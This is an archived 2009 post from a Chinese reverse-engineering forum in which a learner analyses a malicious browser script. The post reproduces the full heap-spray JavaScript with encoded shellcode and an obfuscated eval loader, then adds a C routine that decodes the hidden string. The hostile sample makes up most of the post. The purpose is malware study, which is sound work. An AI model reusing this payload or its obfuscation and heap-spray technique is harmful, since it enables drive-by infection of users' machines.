# 分析一个简单的shellcode网马

> **作者**: frozenrain | **发布时间**: 2009-09-27 10:23:00 | **版块**: 『病毒分析区』 | **查看/回复**: 19438 / 28
> **原文**: [https://www.52pojie.cn/thread-32826-1-1.html](https://www.52pojie.cn/thread-32826-1-1.html)

---

*本帖最后由 smallyou93 于 2009-10-10 00:40 编辑*

看了roxiel这么多教程，自己也来动手实践一下。先感谢斑竹的教程。![](https://static.52pojie.cn/static/image/smiley/default/lol.gif)

```
网马代码
var memory;
var nop = unescape("%u0808"+"%u0808");
var spray=decodeURI("abcd0C0Cabcd6090abcd1CEBabcd4B5BabcdC933abcdB966abcd03F8abcd3B81abcd0BFFabcdE160abcd850Fabcd0254abcd0000abcd3480abcdE20BabcdFAE2abcd05EBabcdDFE8abcdFFFFabcd0BFFabcdE160abcdE2E2abcd86BDabcdD243abcdE2E2abcd69E2abcdEEA2abcd9269abcd4FFEabcd8A69abcd69EAabcd8815abcdBBEDabcdC00AabcdE2E1abcd72E2abcd1A00abcdD18AabcdE2D0abcd8AE2abcd91B7abcd9087abcd69B6abcdEEA4abcd720AabcdE2E0abcd69E2abcd880AabcdBBE3abcdE00AabcdE2E1abcd00E2abcd8A1Babcd8C8DabcdE2E2abcd978Aabcd8E90abcdB68FabcdF41Dabcd2267abcdF197abcd8D8AabcdE28Cabcd8AE2abcd9097abcd8F8Eabcd69B6abcdEEA4abcd820AabcdE2E0abcd69E2abcd880AabcdBBE3abcd300AabcdE2E0abcd00E2abcd8A1BabcdD18EabcdE2D0abcd918Aabcd878AabcdB68EabcdA469abcd0AEEabcdE0A3abcdE2E2abcd0A69abcdE388abcd0ABBabcdE051abcdE2E2abcd1B00abcd0E63abcdE3E2abcdE2E2abcd3E69abcd2163abcdE262abcdE2E2abcdE288abcdF888abcd88B1abcd1DE2abcdA6B4abcd22D1abcd62A2abcdE1DEabcd97E2abcd6B1Babcd7264abcdE2E2abcd25E2abcdE1E6abcd83BEabcd87CCabcdA625abcdE6E1abcd879AabcdE2E2abcd2BD1abcdB3B3abcdB5B1abcdD1B3abcd6922abcdA2A4abcd0C0AabcdE2E3abcd61E2abcdE21Aabcd67EDabcdE37EabcdE2E2abcdE288abcdE288abcdE188abcdE288abcdE088abcdE28AabcdE2E2abcdB122abcdA469abcd0AC6abcdE32FabcdE2E2abcd1A61abcdED1Dabcd9966abcdE2E3abcd6BE2abcd82A4abcdE288abcd1DB2abcdCAB4abcdA46Babcd6986abcd7264abcdE2E2abcd25E2abcdE1E6abcd80BEabcd87CCabcdA625abcdE6E1abcd879AabcdE2E2abcdE288abcdE288abcdE088abcdE288abcdE288abcdE28AabcdE2E2abcdB1A2abcdA469abcd0AC6abcdE369abcdE2E2abcd1A61abcdED1DabcdDB66abcdE2E3abcd6BE2abcd6664abcdE2E2abcd6BE2abcd6E7CabcdE2E2abcd69E2abcd82A4abcdE288abcdE288abcdE288abcdA469abcdB282abcdB41Dabcd25DAabcd92A4abcdE2E2abcdE2E2abcdA425abcdE296abcdE2E2abcd63E2abcdE225abcdE2E0abcdD1E2abcd6939abcd86BCabcdE288abcdA46FabcdB292abcdE28AabcdE2E6abcdB5E2abcd941Dabcd1D82abcdE6B4abcd2BD1abcdE25BabcdE2E6abcd62E2abcdED9Eabcd771DabcdEE96abcd9E62abcd1DEDabcd96E2abcd62E7abcdED96abcd771Dabcd0900abcd2169abcdE2CFabcdE2E6abcd61E2abcdE21AabcdE19DabcdBC6Babcd8892abcd6FE2abcd96A4abcd1DB2abcd9294abcd1DB5abcd6654abcdE2E2abcd1DE2abcdD2B4abcd0963abcdE6E2abcdE2E2abcd1961abcd9DE2abcd1D47abcd8294abcdB41Dabcd1DD6abcd6654abcdE2E2abcd1DE2abcdD6B4abcd6469abcdE272abcdE2E2abcd7C69abcdE26EabcdE2E2abcdE625abcdBEE1abcdCC83abcdB187abcdB41Dabcd69CEabcd6E5CabcdE2E2abcd69E2abcd7264abcdE2E2abcd25E2abcdE5E6abcd80BEabcd87CCabcd0E63abcdE3E2abcdE2E2abcd3E69abcdE28AabcdE2E3abcdB1E2abcdE28AabcdE2E3abcdB5E2abcdE288abcdE288abcdB41Dabcd69FEabcdD119abcdD122abcd6339abcdE20EabcdE2E0abcd69E2abcd612EabcdB61AabcdEA9FabcdFE6Babcd61E3abcdE622abcd1109abcd2E69abcd3B69abcd2161abcdD1F2abcdB222abcdB1B3abcdB2B2abcdB2B2abcdB2B2abcdB2B5abcd69B2abcdEAA4abcd650AabcdE2E2abcd63E2abcdFA26abcdE2E6abcd83E2abcdA425abcdE1F6abcdE2E2abcdD1E2abcd692BabcdC6DEabcd0D61abcd6194abcdEA26abcd2BD1abcd051DabcdE288abcdB41Dabcd86F6abcdD243abcdE2E2abcd69E2abcdEEA2abcd9269abcd4FFEabcd8A69abcd69EAabcd6B15abcd86B4abcdE688abcd0ABBabcdE241abcdE2E2abcd0072abcd8A1AabcdD0D1abcdE2E2abcdB78Aabcd8791abcdB690abcdE469abcdF00AabcdE2E2abcd69E2abcd880AabcdBBE7abcd660AabcdE2E2abcd00E2abcdD11BabcdB51DabcdB41Dabcd62E6abcd0ADAabcdDA62abcd970Babcd63F3abcdE79Aabcd7272abcd7272abcdEA96abcd1D69abcd69B7abcd6F0EabcdE7A2abcd021DabcdDA0AabcdE2E2abcd21E2abcdDA62abcd620Aabcd0BDAabcdF397abcd9A63abcd72E7abcd7272abcd9672abcd8A05abcdE8EAabcdE2E2abcdA26Fabcd1DE7abcd0A02abcdE2F5abcdE2E2abcd0A21abcdE2F3abcdE2E2abcdF35AabcdE6E3abcd2062abcdE2EEabcdE009abcd21BAabcd1B0Aabcd1D1DabcdB91DabcdE524abcd6B5AabcdE3BDabcd2584abcdE7A5abcd021DabcdB121abcd3E69abcd88B1abcd8AA2abcdF2E2abcdE2E2abcd69B5abcdC2A4abcd640Aabcd1D1DabcdBA1DabcdB321abcd69B4abcdDE97abcd9669abcd9ACCabcd17E1abcd69B4abcdC294abcd17E1abcd2BD1abcdA3ABabcdE14FabcdD127abcdED39abcdF25Cabcd34D8abcdEA96abcd2923abcdE1E5abcdA238abcd1309abcdFDD9abcd0597abcd69BCabcdC6BCabcd3FE1abcd6984abcdA9EEabcdBC69abcdE1FEabcd693Fabcd69E6abcd27E1abcdBC49abcd21BBabcd9B0Aabcd1D1Eabcd501Dabcd0010abcd5016abcdEDD4abcd12F1abcd99AAabcdD0DFabcd7396abcd67EEabcd4D3Dabcd8159abcd336BabcdB3ADabcd58A2abcdE59DabcdC070abcdFC92abcd8646abcd710Dabcd06D0abcd6C76abcdE8F1abcd9B4Eabcd04DBabcd267AabcdFD6FabcdB596abcdEF84abcdA11Dabcd4E5Cabcd7A39abcdF2E8abcd621Aabcd4D34abcd1978abcdF7B1abcd8A84abcd9696abcdD892abcdCDCDabcd8083abcdCC8Cabcd8C86abcdD291abcdD7D5abcdCCD7abcd878CabcdCD96abcdCD86abcd8686abcdCC86abcd9A87abcdE287abcdE2E2abcd");
var sss =Array(198,177,194,112,163,147,141,197,190,181,195,179,177,192,181,120,195,192,194,177,201,126,194,181,192,188,177,179,181,120,127,177,178,179,180,127,183,144,114,117,197,114,121,121,139,199,184,185,188,181,120,190,191,192,126,188,181,190,183,196,184,112,140,141,112,128,200,129,128,128,128,128,127,130,121,112,190,191,192,123,141,190,191,192,139,89,190,191,192,141,190,191,192,126,195,197,178,195,196,194,185,190,183,120,128,144,128,200,129,128,128,128,128,127,130,112,125,112,163,147,126,188,181,190,183,196,184,121,139,89,189,181,189,191,194,201,141,190,181,199,112,145,194,194,177,201,120,121,139);
var arr =new Array();
for(var i=0;i<sss.length;i++)
{ 
arr[i]=String.fromCharCode(sss[i]-80); 
} 

var avsp = "meimei";
var dd = arr.toString().replace(/,/g,"");
dd = dd.replace(/@/g,",")
eval(dd); 
        for(i=0;i<0x600;i++)
        {memory[i]=nop + SC;}
</script>
```

很简单的JS脚本语言， sss 是简单加密后的字符串，eval是执行dd,我们先解出它来，只会C语言，用它写了

```
void  main(int argc, char* argv[])
{
        for(int i=0;i<sizeof(sss)/sizeof(char);i++)
        {
                sss[i]-=80;
                if(sss[i]==0x2c)//,
                {
                        sss[i]=0x20;//space
                }
                if(sss[i]==0x40)//,@
                {
                        sss[i]=0x2c;//,
                }        
        }
        printf("%s\n",sss);
}
```

解码后效果

![](https://attach.52pojie.cn/forum/month_0909/09092710232409fcf1fce3f16b.jpg)

这段代码的大致意思是将abcd替换成%u，但是我们将替换后的16进制数据解码后也没看到地址，那就把这段shellcode丢进OD里跑一跑吧
地址出来了，到此结束。

![](https://attach.52pojie.cn/forum/month_0909/0909271023f8987e0215d4adc6.jpg)

谢谢！，至于是如何触发这个shellcode的，功力不深，还在学习中!:)eee
字体不知道怎么搞的不会搞了。
